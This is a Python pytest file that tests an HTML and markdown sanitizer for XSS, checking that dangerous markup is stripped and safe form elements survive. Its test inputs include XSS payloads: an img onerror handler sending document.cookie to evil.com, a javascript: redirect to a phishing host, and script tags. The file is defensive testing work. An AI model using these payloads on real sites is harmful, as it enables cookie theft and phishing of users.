"""
Security Unit Tests for Artifact Sanitizer (XSS Mitigation)
"""
import pytest
from backend.app.artifacts.sanitizer import sanitize_html, sanitize_markdown

def test_sanitize_blocks_script_tags():
    raw = "<div><h1>Growth Model</h1><script>alert('XSS Attack!');</script><p>Safe text</p></div>"
    clean = sanitize_html(raw)
    assert "<script" not in clean.lower()
    assert "alert(" not in clean
    assert "Safe text" in clean
    assert "Content-Security-Policy" in clean

def test_sanitize_blocks_onerror_attributes():
    raw = '<img src="invalid-image.png" onerror="fetch(\'http://evil.com/steal?cookie=\'+document.cookie)">'
    clean = sanitize_html(raw)
    assert "onerror" not in clean.lower()
    assert "steal?cookie" not in clean

def test_sanitize_blocks_javascript_urls():
    raw = '<a href="javascript:window.parent.location=\'http://phishing.com\'">Click here for metrics</a>'
    clean = sanitize_html(raw)
    assert "javascript:" not in clean.lower()
    assert "Click here for metrics" in clean

def test_sanitize_allows_interactive_inputs_and_buttons():
    raw = """
    <div class="calculator">
      <h2>CAC Payback Calculator</h2>
      <label for="cac">CAC ($):</label>
      <input type="number" id="cac" value="5000">
      <button id="calc-btn">Calculate Payback</button>
    </div>
    """
    clean = sanitize_html(raw)
    assert "<input" in clean
    assert "<button" in clean
    assert 'id="cac"' in clean
    assert "CAC Payback Calculator" in clean

def test_sanitize_markdown_strips_scripts():
    md = "# Strategy\n\n<script>maliciousCode();</script>\n\nHere are the 3 pillars."
    clean = sanitize_markdown(md)
    assert "<script" not in clean
    assert "Here are the 3 pillars." in clean
